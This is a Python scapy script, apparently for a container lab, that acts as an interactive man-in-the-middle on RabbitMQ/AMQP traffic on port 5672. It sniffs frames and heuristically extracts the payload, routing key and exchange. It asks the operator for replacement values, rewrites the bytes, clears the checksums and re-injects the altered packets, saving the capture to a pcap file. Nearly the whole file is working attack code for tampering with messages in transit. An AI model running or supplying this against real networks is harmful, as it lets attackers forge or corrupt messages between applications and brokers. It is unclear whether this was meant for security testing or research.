from scapy.all import sniff, sendp, wrpcap, get_if_list, Raw

OUTPUT = "/captures/trace_mitm.pcap"

interfaces = get_if_list()
print("Interfaces detectadas en este contenedor:", flush=True)
for i, iface in enumerate(interfaces):
    print(f"  [{i+1}] {iface}", flush=True)

input_str = input("\nElige la interfaz por nombre o número (ENTER para 'eth0'): ").strip()
if input_str == "":
    IFACE = "eth0"
elif input_str.isdigit() and 1 <= int(input_str) <= len(interfaces):
    IFACE = interfaces[int(input_str) - 1]
else:
    IFACE = input_str

FILTER = "tcp port 5672"
print(f"\nMITM sniffing on interface: {IFACE} | filter: {FILTER}\n", flush=True)

captured_packets = []
modificados = 0

def find_str(data, label):
    try:
        index = data.index(label)
        length = data[index-1]
        value = data[index:index+length].decode(errors="ignore")
        return value
    except Exception:
        return "No encontrado"

def patch_and_resend(pkt):
    global modificados
    if pkt.haslayer(Raw):
        data = pkt[Raw].load
        # INTENTAR EXTRAER algunos campos del frame AMQP
        # Buscar el payload
        payload = ""
        routing_key = ""
        exchange = ""
        try:
            payload = data.split(b'\x00', 1)[-1].decode(errors="ignore")
        except Exception:
            pass

        # Imprimir los campos útiles
        print("\n--- Paquete detectado ---")
        print("Resumen:", pkt.summary())
        print("Payload detectado:", payload)
        # Buscar routing key y exchange por heurística (no 100% confiable sin parsear AMQP)
        if b"basic.publish" in data.lower():
            # Busca después de la palabra 'basic.publish'
            rk_pos = data.lower().find(b"basic.publish")
            rk_field = data[rk_pos+13:rk_pos+32]
            try:
                routing_key = rk_field.split(b'\x00')[0].decode(errors="ignore")
            except:
                routing_key = "No encontrado"
            print("Routing Key (probable):", routing_key)

        if b"exchange" in data.lower():
            ex_pos = data.lower().find(b"exchange")
            ex_field = data[ex_pos+8:ex_pos+24]
            try:
                exchange = ex_field.split(b'\x00')[0].decode(errors="ignore")
            except:
                exchange = "No encontrado"
            print("Exchange (probable):", exchange)

        # INTERACTIVO: Pide nuevos valores
        modificar = input("¿Quieres modificar este paquete? (s/n): ").strip().lower()
        if modificar == "s":
            nuevo_payload = input(f"Nuevo payload (ENTER para '{payload}'): ").encode() or payload.encode()
            nuevo_rk = input(f"Nuevo Routing Key (ENTER para '{routing_key}'): ").encode() or routing_key.encode()
            nuevo_exchange = input(f"Nuevo Exchange (ENTER para '{exchange}'): ").encode() or exchange.encode()
            # PATCH: Reemplaza en los bytes, si están presentes
            if payload.encode() in data:
                data = data.replace(payload.encode(), nuevo_payload)
            if routing_key.encode() in data:
                data = data.replace(routing_key.encode(), nuevo_rk)
            if exchange.encode() in data and exchange:
                data = data.replace(exchange.encode(), nuevo_exchange)
            pkt[Raw].load = data
            # Recalcula checksums y longitudes
            if pkt.haslayer('IP'):
                del pkt['IP'].chksum
                del pkt['IP'].len
            if pkt.haslayer('TCP'):
                del pkt['TCP'].chksum
            print("[MODIFICADO] Reenviando paquete modificado...", flush=True)
            sendp(pkt, iface=IFACE, verbose=False)
            modificados += 1
        else:
            print("[NO MODIFICADO] Paquete no alterado.\n", flush=True)
    captured_packets.append(pkt)

sniff(filter=FILTER, iface=IFACE, prn=patch_and_resend, timeout=60)

wrpcap(OUTPUT, captured_packets)
print(f"\nGuardado {len(captured_packets)} paquetes en {OUTPUT}", flush=True)
print(f"Paquetes modificados y reenviados: {modificados}", flush=True)